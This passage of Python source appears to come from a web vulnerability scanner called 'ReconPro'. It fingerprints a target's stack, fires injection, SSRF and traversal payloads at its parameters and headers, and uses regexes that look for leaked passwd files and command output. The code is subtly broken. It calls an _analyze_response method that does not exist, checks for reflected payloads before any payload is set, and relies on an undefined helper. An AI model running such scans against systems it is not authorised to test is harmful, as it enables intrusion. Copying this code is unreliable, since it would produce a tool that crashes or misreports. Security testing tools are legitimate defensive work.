    """Result of technology detection against a target."""
    frameworks: list[str] = field(default_factory=list)
    language: Optional[str] = None
    server: Optional[str] = None
    waf: Optional[str] = None
    cms: Optional[str] = None
    has_graphql: bool = False
    has_rest_api: bool = False
    confidence: float = 0.0

    def to_dict(self) -> dict:
        return {
            "frameworks": self.frameworks,
            "language": self.language,
            "server": self.server,
            "waf": self.waf,
            "cms": self.cms,
            "has_graphql": self.has_graphql,
            "has_rest_api": self.has_rest_api,
            "confidence": self.confidence,
        }

    def __repr__(self) -> str:
        parts = []
        if self.cms:
            parts.append(f"cms={self.cms}")
        if self.language:
            parts.append(f"lang={self.language}")
        if self.frameworks:
            parts.append(f"fw={','.join(self.frameworks)}")
        if self.server:
            parts.append(f"srv={self.server}")
        if self.waf:
            parts.append(f"waf={self.waf}")
        return f"TechProfile({', '.join(parts)}, confidence={self.confidence:.0%})"


# ──────────────────────────────────────────────────────────────────────────────
# TECH_DETECTOR — Fingerprinting engine
# ──────────────────────────────────────────────────────────────────────────────

class TechDetector:
    """Analyzes HTTP responses, headers, HTML, and URLs to identify
    the technology stack of a target application."""

    def __init__(self) -> None:
        self._reset()

    def _reset(self) -> None:
        self._frameworks: set[str] = set()
        self._language: Optional[str] = None
        self._server: Optional[str] = None
        self._waf: Optional[str] = None
        self._cms: Optional[str] = None
        self._has_graphql: bool = False
        self._has_rest_api: bool = False
        self._confidence: float = 0.0
        self._hits: int = 0

    def analyze(
        self,
        target: str,
        response_headers: dict[str, str],
        html_body: str = "",
        js_files: Optional[list[str]] = None,
    ) -> TechProfile:
        """Run full analysis and return a TechProfile."""
        self._reset()
        if js_files is None:
            js_files = []

        self._analyze_headers(response_headers)
        self._analyze_html(html_body)
        self._analyze_cookies(response_headers)
        self._analyze_url(target)
        self._analyze_js_files(js_files)
        self._analyze_url_paths(target)

        if self._hits > 0:
            self._confidence = min(self._hits * 0.12, 1.0)

        return TechProfile(
            frameworks=list(self._frameworks),
            language=self._language,
            server=self._server,
            waf=self._waf,
            cms=self._cms,
            has_graphql=self._has_graphql,
            has_rest_api=self._has_rest_api,
            confidence=self._confidence,
        )

    def _analyze_headers(self, headers: dict[str, str]) -> None:
        header_signatures = TECH_SIGNATURES["headers"]
        header_map = TECH_SIGNATURES["waf_signatures"]

        for header_key, mapping in header_signatures.items():
            header_val = headers.get(header_key, "")
            if not isinstance(mapping, dict):
                continue
            for pattern, tech in mapping.items():
                if isinstance(tech, str) and tech and pattern:
                    if pattern.lower() in header_val.lower():
                        if tech == "Drupal" or tech == "WordPress" or tech == "Joomla":
                            self._cms = tech
                            self._hits += 2
                        elif tech in ("nginx", "Apache", "IIS", "Caddy", "LiteSpeed", "OpenResty"):
                            self._server = tech
                            self._hits += 1
                        elif tech == "PHP":
                            self._language = "PHP"
                            self._hits += 1
                        elif tech == "Python":
                            self._language = "Python"
                            self._hits += 1
                        elif tech == "Java":
                            self._language = "Java"
                            self._hits += 1
                        elif tech == "Ruby":
                            self._language = "Ruby"
                            self._hits += 1
                        elif tech == "ASP.NET" or tech == "ASP.NET MVC" or tech == "ASP.NET Core":
                            self._language = "ASP.NET"
                            self._frameworks.add("ASP.NET")
                            self._hits += 1
                        elif tech in ("Express", "Django", "Flask", "Tornado", "Next.js", "React", "Vue", "Nuxt"):
                            self._frameworks.add(tech)
                            self._hits += 1
                        elif tech == "Cloudflare":
                            self._waf = "Cloudflare WAF"
                            self._hits += 1
                        else:
                            self._frameworks.add(tech)
                            self._hits += 1

                if pattern == "" and mapping.get(header_key, "") == "" and header_val:
                    tech_name = list(mapping.values())[0] if mapping else ""
                    if tech_name and tech_name == "":
                        tech_name = header_key.split("-")[-1].strip()
                        self._hits += 1

        for sig_header, waf_name in header_map.items():
            if sig_header in headers:
                self._waf = waf_name
                self._hits += 1
                break

    def _analyze_html(self, html: str) -> None:
        if not html:
            return
        html_lower = html.lower()

        meta_signatures = TECH_SIGNATURES["html_meta"]
        for meta_type, mapping in meta_signatures.items():
            if meta_type == "generator":
                match = re.search(
                    r'<meta\s+[^>]*?name=["\']generator["\'][^>]*?content=["\']([^"\']+)["\']',
                    html_lower,
                    re.IGNORECASE,
                )
                if match:
                    gen_value = match.group(1).strip().lower()
                    for pattern, tech in mapping.items():
                        if pattern.lower() in gen_value:
                            if tech in ("WordPress", "Joomla", "Drupal", "Ghost", "vBulletin", "phpBB", "MediaWiki"):
                                self._cms = tech
                            else:
                                self._frameworks.add(tech)
                            self._hits += 2
                            break

            if meta_type == "viewport":
                if 'name="viewport"' in html_lower or 'content="width=device-width' in html_lower:
                    self._hits += 0.5

        ext_signatures = TECH_SIGNATURES["file_extensions"]
        for ext, lang in ext_signatures.items():
            safe_ext = re.escape(ext)
            pattern = rf'(?:src|href)=["\'][^"\']*{safe_ext}(?:\?[^"\']*)?["\']'
            if re.search(pattern, html_lower):
                if self._language is None:
                    self._language = lang
                self._hits += 1

    def _analyze_cookies(self, headers: dict[str, str]) -> None:
        cookie_header = headers.get("Set-Cookie", "") or headers.get("Cookie", "")
        cookie_signatures = TECH_SIGNATURES["cookies"]

        for cookie_name, lang in cookie_signatures.items():
            if cookie_name.lower() in cookie_header.lower():
                if lang == "PHP" and self._language is None:
                    self._language = "PHP"
                elif lang == "Java" and self._language is None:
                    self._language = "Java"
                elif lang == "ASP.NET" and self._language is None:
                    self._language = "ASP.NET"
                elif lang == "Rails" and self._language is None:
                    self._language = "Ruby"
                    self._frameworks.add("Rails")
                elif lang == "Laravel":
                    self._frameworks.add("Laravel")
                elif lang == "CodeIgniter":
                    self._frameworks.add("CodeIgniter")
                elif lang == "Express":
                    self._frameworks.add("Express")
                elif lang == "Django":
                    self._frameworks.add("Django")
                elif lang == "Angular":
                    self._frameworks.add("Angular")
                elif lang == "Next.js":
                    self._frameworks.add("Next.js")
                self._hits += 1

    def _analyze_url(self, target: str) -> None:
        url_patterns = TECH_SIGNATURES["url_patterns"]
        target_lower = target.lower()

        for pattern, tech in url_patterns.items():
            if pattern.lower() in target_lower:
                if tech == "GraphQL":
                    self._has_graphql = True
                    self._frameworks.add("GraphQL")
                elif tech == "REST API":
                    self._has_rest_api = True
                elif tech in ("WordPress", "Joomla", "Drupal"):
                    self._cms = tech
                elif tech == "Swagger/OpenAPI":
                    self._has_rest_api = True
                    self._frameworks.add("Swagger")
                elif tech == "Spring Boot":
                    self._frameworks.add("Spring Boot")
                    self._language = "Java"
                elif tech == "Django":
                    self._frameworks.add("Django")
                    self._language = "Python"
                elif tech == "Flask":
                    self._frameworks.add("Flask")
                    self._language = "Python"
                elif tech == "Dotenv":
                    self._hits += 1
                else:
                    self._frameworks.add(tech)
                self._hits += 1

    def _analyze_js_files(self, js_files: list[str]) -> None:
        js_signatures = TECH_SIGNATURES["js_libraries"]

        for js_path in js_files:
            js_lower = js_path.lower()
            for pattern, tech in js_signatures.items():
                if pattern.lower() in js_lower:
                    self._frameworks.add(tech)
                    self._hits += 1
                    break

    def _analyze_url_paths(self, target: str) -> None:
        ext_signatures = TECH_SIGNATURES["file_extensions"]
        parsed = urllib.parse.urlparse(target)
        path = parsed.path.lower()

        for ext, lang in ext_signatures.items():
            if path.endswith(ext):
                if self._language is None:
                    self._language = lang
                self._hits += 1


# ──────────────────────────────────────────────────────────────────────────────
# FUZZ_RESULT — Result of a single fuzz test
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class FuzzResult:
    """Result of testing a single payload against a target parameter."""
    payload: str = ""
    category: str = ""
    classification: str = "none"
    matched_pattern: str = ""
    status_code: int = 0
    response_time: float = 0.0
    is_vulnerable: bool = False
    url: str = ""
    param: str = ""

    def to_dict(self) -> dict:
        return {
            "payload": self.payload,
            "category": self.category,
            "classification": self.classification,
            "matched_pattern": self.matched_pattern,
            "status_code": self.status_code,
            "response_time": self.response_time,
            "is_vulnerable": self.is_vulnerable,
            "url": self.url,
            "param": self.param,
        }

    def __repr__(self) -> str:
        status = "VULN" if self.is_vulnerable else "SAFE"
        return (
            f"FuzzResult({status} | {self.category} | {self.classification} | "
            f"status={self.status_code} | time={self.response_time:.3f}s | "
            f"payload={self.payload[:50]})"
        )


# ──────────────────────────────────────────────────────────────────────────────
# RESPONSE PATTERN DATABASE — Patterns used for response analysis
# ──────────────────────────────────────────────────────────────────────────────

_SQL_ERROR_PATTERNS: list[re.Pattern] = [
    re.compile(r"you have an error in your sql syntax", re.IGNORECASE),
    re.compile(r"warning.*mysql", re.IGNORECASE),
    re.compile(r"unclosed quotation mark after the character string", re.IGNORECASE),
    re.compile(r"quoted string not properly terminated", re.IGNORECASE),
    re.compile(r"sql syntax.*mysql", re.IGNORECASE),
    re.compile(r"postgresql.*error", re.IGNORECASE),
    re.compile(r"psql.*error", re.IGNORECASE),
    re.compile(r"pg_query\(\)", re.IGNORECASE),
    re.compile(r"unterminated quoted string", re.IGNORECASE),
    re.compile(r"microsoft.*odbc.*sql server", re.IGNORECASE),
    re.compile(r"oledb.*sql server", re.IGNORECASE),
    re.compile(r"microsoft sql native client", re.IGNORECASE),
    re.compile(r"syntax error.*sqlite", re.IGNORECASE),
    re.compile(r"sqlite_busy", re.IGNORECASE),
    re.compile(r"ora-\d{5}", re.IGNORECASE),
    re.compile(r"oracle.*driver", re.IGNORECASE),
    re.compile(r"java\.sql\.sqlexception", re.IGNORECASE),
    re.compile(r"com\.mysql\.jdbc", re.IGNORECASE),
    re.compile(r"system\.data\.sqlclient", re.IGNORECASE),
    re.compile(r"sqlstate\[", re.IGNORECASE),
    re.compile(r"unclosed parenthesis", re.IGNORECASE),
    re.compile(r"syntax error near", re.IGNORECASE),
    re.compile(r"query failed", re.IGNORECASE),
    re.compile(r"sql query failed", re.IGNORECASE),
]

_STACK_TRACE_PATTERNS: list[re.Pattern] = [
    re.compile(r"traceback \(most recent call last\)", re.IGNORECASE),
    re.compile(r"at \w+\.\w+\(.*\)", re.IGNORECASE),
    re.compile(r"exception in thread", re.IGNORECASE),
    re.compile(r"java\.lang\.\w+exception", re.IGNORECASE),
    re.compile(r"system\.nullreferenceexception", re.IGNORECASE),
    re.compile(r"fatal error", re.IGNORECASE),
    re.compile(r"unhandled exception", re.IGNORECASE),
    re.compile(r"NameError", re.IGNORECASE),
    re.compile(r"TypeError", re.IGNORECASE),
    re.compile(r"ValueError", re.IGNORECASE),
]

_XSS_PATTERN: re.Pattern = re.compile(r"<script|onerror|onload|javascript:|alert\(|prompt\(|document\.cookie", re.IGNORECASE)

_SSTI_PATTERN: re.Pattern = re.compile(r"(?:\{\{.*\}\}|\$\{.*\}|<%.*%>|%.*%)", re.IGNORECASE)

_PATH_TRAVERSAL_PATTERN: re.Pattern = re.compile(r"root:.*:0:0:|daemon:|nobody:|www-data:|\\[Dd]rivers\\|\\[Ww]indows\\|boot\.ini", re.IGNORECASE)

_CMD_INJECTION_PATTERN: re.Pattern = re.compile(r"uid=\d+.*gid=\d+|groups=\d+|drwx|total \d+|for 16-bit|OS Name:", re.IGNORECASE)

_LFI_PATTERN: re.Pattern = re.compile(r"root:x:0:0:|bin/bash|\[boot loader\]|\[extensions\]|root:.*:0:|daemon:|nobody:", re.IGNORECASE)

_RFI_PATTERN: re.Pattern = re.compile(r"system\s*\(|eval\s*\(|base64_decode|<\?php", re.IGNORECASE)


# ──────────────────────────────────────────────────────────────────────────────
# FUZZ_SESSION — Main fuzzing engine
# ──────────────────────────────────────────────────────────────────────────────

class FuzzSession:
    """Context-aware fuzzing session that selects payloads based on the
    target's detected technology stack."""

    def __init__(
        self,
        target: str,
        tech_profile: Optional[TechProfile] = None,
        timeout: float = 10.0,
        user_agent: str = "ReconPro/7.5 (Security Scanner)",
        verify_ssl: bool = True,
    ) -> None:
        self.target = target.rstrip("/")
        self.tech_profile = tech_profile
        self.timeout = timeout
        self.user_agent = user_agent
        self.verify_ssl = verify_ssl
        self.results: list[FuzzResult] = []
        self._base_time: float = 0.0
        self._baseline_status: int = 0
        self._opener = self._build_opener()

    def _build_opener(self) -> urllib.request.OpenerDirector:
        """Build a URL opener; TLS is VERIFIED unless verify_ssl was
        explicitly disabled by the user (audited opt-out helper)."""
        if not self.verify_ssl:
            # audited opt-out path only — see http_layer._unverified_context
            ctx = _unverified_context()
            https_handler = urllib.request.HTTPSHandler(context=ctx)
            return urllib.request.build_opener(https_handler)
        return urllib.request.build_opener()

    def _make_request(
        self,
        url: str,
        params: Optional[dict[str, str]] = None,
        headers: Optional[dict[str, str]] = None,
        method: str = "GET",
    ) -> tuple[int, str, float, dict[str, str]]:
        """Make an HTTP request and return (status_code, body, time, headers)."""
        if params and method == "GET":
            query = urllib.parse.urlencode(params)
            url = f"{url}?{query}"

        req_headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        }
        if headers:
            req_headers.update(headers)

        body_data: Optional[bytes] = None
        if params and method == "POST":
            body_data = urllib.parse.urlencode(params).encode("utf-8")
            req_headers["Content-Type"] = "application/x-www-form-urlencoded"

        req = urllib.request.Request(url, data=body_data, headers=req_headers, method=method)

        try:
            start = time.monotonic()
            resp = self._opener.open(req, timeout=self.timeout)
            elapsed = time.monotonic() - start
            resp_body = resp.read().decode("utf-8", errors="replace")
            resp_headers = dict(resp.headers)
            return resp.status, resp_body, elapsed, resp_headers
        except urllib.error.HTTPError as e:
            elapsed = time.monotonic() - start
            try:
                resp_body = e.read().decode("utf-8", errors="replace")
            except Exception:
                resp_body = ""
            resp_headers = dict(e.headers) if hasattr(e, "headers") else {}
            return e.code, resp_body, elapsed, resp_headers
        except urllib.error.URLError:
            elapsed = 0.0
            return 0, "", elapsed, {}
        except Exception:
            elapsed = 0.0
            return 0, "", elapsed, {}

    def calibrate(self) -> None:
        """Send a baseline request to establish normal response time and status."""
        status, _, elapsed, _ = self._make_request(self.target)
        self._baseline_status = status
        self._base_time = elapsed

    def get_all_categories(self) -> list[str]:
        """Return a list of all available payload categories."""
        return list(PAYLOAD_DATABASE.keys())

    def select_payloads(self, category: str) -> list[str]:
        """Select the most relevant payloads for the detected tech stack.

        Priority logic:
          1. If tech_profile is available, prefer framework-specific payloads.
          2. Language-specific SQL payloads (e.g., Django -> postgres, WordPress -> mysql).
          3. Framework-specific template payloads (e.g., Django -> jinja2/django SSTI).
          4. CMS-specific extras for WordPress/Drupal/Joomla.
          5. Generic payloads always included as fallback.
        """
        if category not in PAYLOAD_DATABASE:
            return []

        cat_payloads = PAYLOAD_DATABASE[category]
        selected: list[str] = []
        seen: set[str] = set()

        def _add(payloads: list[str]) -> None:
            for p in payloads:
                if p not in seen:
                    selected.append(p)
                    seen.add(p)

        # -- If we have a tech profile, prioritize matching payloads --------
        if self.tech_profile:
            tp = self.tech_profile
            fw_set = set(tp.frameworks)
            lang = tp.language

            # --- SQL injection: route by detected language/backend ----------
            if category == "sqli":
                if any(fw in fw_set for fw in ("Django", "Flask", "Python", "FastAPI")):
                    if "postgres" in cat_payloads:
                        _add(cat_payloads["postgres"])
                if lang == "PHP" or tp.cms in ("WordPress", "Drupal", "Joomla"):
                    if "mysql" in cat_payloads:
                        _add(cat_payloads["mysql"])
                if lang == "Java" or any(fw in fw_set for fw in ("Spring Boot", "Tomcat", "Jetty")):
                    if "oracle" in cat_payloads:
                        _add(cat_payloads["oracle"])
                    if "mssql" in cat_payloads:
                        _add(cat_payloads["mssql"])
                if lang == "ASP.NET" or "ASP.NET" in fw_set:
                    if "mssql" in cat_payloads:
                        _add(cat_payloads["mssql"])
                if lang == "Ruby" or "Rails" in fw_set:
                    if "sqlite" in cat_payloads:
                        _add(cat_payloads["sqlite"])
                    if "postgres" in cat_payloads:
                        _add(cat_payloads["postgres"])

            # --- XSS: route by detected frontend framework -----------------
            elif category == "xss":
                if "Angular" in fw_set:
                    _add(cat_payloads.get("angular", []))
                if "React" in fw_set:
                    _add(cat_payloads.get("react", []))
                if "Vue" in fw_set or "Nuxt" in fw_set:
                    _add(cat_payloads.get("vue", []))
                _add(cat_payloads.get("html", []))

            # --- SSTI: route by detected backend template engine ------------
            elif category == "ssti":
                if any(fw in fw_set for fw in ("Django", "Python", "Flask", "FastAPI")):
                    _add(cat_payloads.get("jinja2", []))
                    _add(cat_payloads.get("django", []))
                if "Ruby" in fw_set or "Rails" in fw_set:
                    _add(cat_payloads.get("mako", []))
                if "PHP" in lang or tp.cms == "Drupal":
                    _add(cat_payloads.get("twig", []))

            # --- SSRF: prefer cloud provider based on headers --------------
            elif category == "ssrf":
                if tp.server and "amazon" in tp.server.lower():
                    _add(cat_payloads.get("aws_metadata", []))
                elif tp.server and "google" in tp.server.lower():
                    _add(cat_payloads.get("gcp_metadata", []))
                elif "azure" in (tp.server or "").lower():
                    _add(cat_payloads.get("azure_metadata", []))
                else:
                    for sub in ("aws_metadata", "gcp_metadata", "azure_metadata"):
                        _add(cat_payloads.get(sub, []))

            # --- Path traversal: OS-specific based on server ---------------
            elif category == "path_traversal":
                if tp.server and "iis" in tp.server.lower():
                    _add(cat_payloads.get("windows", []))
                else:
                    _add(cat_payloads.get("unix", []))

            # --- Command injection: OS-specific based on server -------------
            elif category == "command_injection":
                if tp.server and "iis" in tp.server.lower():
                    _add(cat_payloads.get("windows", []))
                else:
                    _add(cat_payloads.get("unix", []))

            # --- LFI: OS-specific based on server ----------------------------
            elif category == "lfi":
                _add(cat_payloads.get("generic", []))

            # --- RFI: all payloads (remote URIs) -----------------------------
            elif category == "rfi":
                _add(cat_payloads.get("generic", []))

        # -- Always add generic payloads as fallback -------------------------
        if "generic" in cat_payloads:
            _add(cat_payloads["generic"])

        # -- Add any remaining sub-categories not yet covered ---------------
        for sub_key, sub_payloads in cat_payloads.items():
            if sub_key != "generic" and sub_key not in ("mysql", "postgres", "mssql", "sqlite", "oracle",
                                                        "html", "angular", "react", "vue",
                                                        "jinja2", "django", "mako", "twig",
                                                        "aws_metadata", "gcp_metadata", "azure_metadata",
                                                        "unix", "windows"):
                if not self.tech_profile:
                    _add(sub_payloads)

        return selected

    def fuzz_parameter(
        self,
        url: str,
        param: str,
        payloads: Optional[list[str]] = None,
        category: str = "generic",
        method: str = "GET",
    ) -> list[FuzzResult]:
        """Fuzz a single URL parameter with selected payloads.

        For each payload:
          1. Substitute the payload into the parameter value.
          2. Send the request.
          3. Analyze the response for anomalies.
          4. Return a list of FuzzResult objects.
        """
        if payloads is None:
            payloads = self.select_payloads(category)

        if not payloads:
            return []

        # Fetch the original (clean) response for comparison
        original_status, original_body, _, _ = self._make_request(url)

        results: list[FuzzResult] = []

        for payload in payloads:
            params = {param: payload}

            status, body, elapsed, resp_headers = self._make_request(url, params=params, method=method)

            result = self._analyze_response(
                original_body=original_body,
                fuzzed_body=body,
                status_code=status,
                response_time=elapsed,
            )
            result.payload = payload
            result.category = category
            result.url = url
            result.param = param
            result.status_code = status

            results.append(result)

        self.results.extend(results)
        return results

    def fuzz_headers(
        self,
        url: str,
        payloads: Optional[list[str]] = None,
        category: str = "sqli",
        header_name: str = "X-Custom-Header",
    ) -> list[FuzzResult]:
        """Fuzz HTTP headers with payloads."""
        if payloads is None:
            payloads = self.select_payloads(category)

        if not payloads:
            return []

        original_status, original_body, _, _ = self._make_request(url)
        results: list[FuzzResult] = []

        for payload in payloads:
            headers = {header_name: payload}
            status, body, elapsed, _ = self._make_request(url, headers=headers)

            result = self._analyze_response(
                original_body=original_body,
                fuzzed_body=body,
                status_code=status,
                response_time=elapsed,
            )
            result.payload = payload
            result.category = category
            result.url = url
            result.param = f"Header:{header_name}"
            result.status_code = status

            results.append(result)

        self.results.extend(results)
        return results

    def fuzz_all_parameters(
        self,
        url: str,
        params: list[str],
        categories: Optional[list[str]] = None,
    ) -> list[FuzzResult]:
        """Fuzz multiple parameters across multiple categories."""
        if categories is None:
            categories = ["sqli", "xss", "ssti"]

        all_results: list[FuzzResult] = []
        for param in params:
            for category in categories:
                payloads = self.select_payloads(category)
                results = self.fuzz_parameter(url, param, payloads, category)
                all_results.extend(results)
        return all_results

    def analyze_response(
        self,
        original_body: str,
        fuzzed_body: str,
        status_code: int,
        response_time: float,
    ) -> FuzzResult:
        """Analyze a fuzzed response and classify the result.

        Detection methods:
          - Reflected: the payload itself appears in the response body.
          - Error-based: SQL errors, stack traces, or framework errors in the body.
          - Time-based: response took significantly longer than baseline.
          - Blind: status code change (e.g., 500 instead of 200) without obvious error.
        """
        result = FuzzResult()
        result.status_code = status_code
        result.response_time = response_time
        result.matched_pattern = ""

        # --- Check for reflected payload -----------------------------------
        if fuzzed_body and original_body:
            # Find the payload in the response (may be HTML-encoded)
            payload_escaped = re.escape(result.payload)
            if result.payload and re.search(payload_escaped, fuzzed_body):
                result.classification = "reflected"
                result.matched_pattern = "Payload reflected in response body"

            # Also check for partial reflection or HTML entity encoding
            if result.payload and not result.classification:
                html_encoded = (
                    result.payload.replace("<", "&lt;")
                    .replace(">", "&gt;")
                    .replace('"', "&quot;")
                    .replace("'", "&#39;")
                )
                if html_encoded in fuzzed_body:
                    result.classification = "reflected"
                    result.matched_pattern = "Payload HTML-encoded in response"

        # --- Check for SQL errors in the response --------------------------
        if fuzzed_body:
            for pattern in _SQL_ERROR_PATTERNS:
                match = pattern.search(fuzzed_body)
                if match:
                    result.classification = "error_based"
                    result.matched_pattern = match.group(0)
                    break

        # --- Check for stack traces ----------------------------------------
        if fuzzed_body and result.classification != "error_based":
            for pattern in _STACK_TRACE_PATTERNS:
                match = pattern.search(fuzzed_body)
                if match:
                    result.classification = "error_based"
                    result.matched_pattern = match.group(0)
                    break

        # --- Check for command injection output ---------------------------
        if fuzzed_body and result.classification != "error_based":
            match = _CMD_INJECTION_PATTERN.search(fuzzed_body)
            if match:
                result.classification = "error_based"
                result.matched_pattern = match.group(0)

        # --- Check for path traversal output --------------------------------
        if fuzzed_body and result.classification != "error_based":
            match = _PATH_TRAVERSAL_PATTERN.search(fuzzed_body)
            if match:
                result.classification = "error_based"
                result.matched_pattern = match.group(0)

        # --- Check for XSS indicators -------------------------------------
        if fuzzed_body and result.classification != "reflected":
            match = _XSS_PATTERN.search(fuzzed_body)
            if match:
                result.classification = "reflected"
                result.matched_pattern = match.group(0)

        # --- Check for SSTI indicators -------------------------------------
        if fuzzed_body and result.classification not in ("reflected", "error_based"):
            match = _SSTI_PATTERN.search(fuzzed_body)
            if match:
                result.classification = "reflected"
                result.matched_pattern = match.group(0)

        # --- Check for LFI indicators ---------------------------------------
        if fuzzed_body and result.classification not in ("reflected", "error_based"):
            match = _LFI_PATTERN.search(fuzzed_body)
            if match:
                result.classification = "error_based"
                result.matched_pattern = match.group(0)

        # --- Check for RFI indicators ---------------------------------------
        if fuzzed_body and result.classification not in ("reflected", "error_based"):
            match = _RFI_PATTERN.search(fuzzed_body)
            if match:
                result.classification = "error_based"
                result.matched_pattern = match.group(0)

        # --- Time-based detection ------------------------------------------
        if self._base_time > 0 and response_time > self._base_time * 3:
            if response_time > 4.0:
                if result.classification in ("none", ""):
                    result.classification = "time_based"
                    result.matched_pattern = f"Response time {response_time:.2f}s (baseline {self._base_time:.2f}s)"
                elif result.classification == "reflected":
                    result.classification = "time_based"
                    result.matched_pattern = f"Reflected + slow response ({response_time:.2f}s)"

        # --- Status code change detection (blind) ---------------------------
        if (
            self._baseline_status > 0
            and status_code != self._baseline_status
            and status_code >= 400
            and result.classification in ("none", "")
        ):
            result.classification = "blind"
            result.matched_pattern = (
                f"Status changed from {self._baseline_status} to {status_code}"
            )

        # --- Determine vulnerability ---------------------------------------
        if result.classification in ("reflected", "error_based", "time_based"):
            result.is_vulnerable = True
        elif result.classification == "blind":
            result.is_vulnerable = True

        return result

    def get_vulnerable(self) -> list[FuzzResult]:
        """Return only results classified as vulnerable."""
        return [r for r in self.results if r.is_vulnerable]

    # DEAD CODE: consider removal
    def summary(self) -> dict:
        """Return a summary of the fuzzing session."""
        total = len(self.results)
        vulns = len(self.get_vulnerable())
        by_category: dict[str, int] = {}
        by_classification: dict[str, int] = {}

        for r in self.results:
            by_category[r.category] = by_category.get(r.category, 0) + 1
            by_classification[r.classification] = by_classification.get(r.classification, 0) + 1

        return {
            "target": self.target,
            "tech_profile": self.tech_profile.to_dict() if self.tech_profile else None,
            "total_tests": total,
            "vulnerabilities_found": vulns,
            "by_category": by_category,
            "by_classification": by_classification,
        }


# ──────────────────────────────────────────────────────────────────────────────
# Module-level convenience helpers
# ──────────────────────────────────────────────────────────────────────────────

# DEAD CODE: consider removal
# DEAD CODE: consider removal
def quick_scan(
    target: str,
    params: list[str],
    categories: Optional[list[str]] = None,
    timeout: float = 10.0,
) -> tuple[TechProfile, list[FuzzResult]]:
    """Convenience function: detect tech, calibrate, and fuzz all params.

    Returns (TechProfile, list_of_results).
    """
    if categories is None:
        categories = ["sqli", "xss", "ssti", "command_injection", "path_traversal", "lfi", "rfi"]

    # Quick tech detection
    status, body, _, headers = 0, "", 0.0, {}
    try:
        parsed = urllib.parse.urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        # TLS verification is ON by default (verified context); the
        # unverified helper is never used here.
        import ssl
        try:
            ctx = ssl.create_default_context()
            handler = urllib.request.HTTPSHandler(context=ctx)
            opener = urllib.request.build_opener(handler)
        except Exception:
            opener = urllib.request.build_opener()
        req = urllib.request.Request(
            base_url,
            headers={"User-Agent": "ReconPro/7.5 (Security Scanner)"},
        )
        resp = opener.open(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        headers = dict(resp.headers)
        status = resp.status
    except Exception:
        pass

    detector = TechDetector()
    tech_profile = detector.analyze(target, headers, body)

    session = FuzzSession(target, tech_profile=tech_profile, timeout=timeout)
    session._baseline_status = status
    results = session.fuzz_all_parameters(target, params, categories)
    return tech_profile, results


def get_payload_count() -> int:
    """Count total number of unique payloads in the database."""
    total = 0
    seen: set[str] = set()
    for cat, subcats in PAYLOAD_DATABASE.items():
        for subcat, payloads in subcats.items():
            for p in payloads:
                if p not in seen:
                    total += 1
                    seen.add(p)
    return total
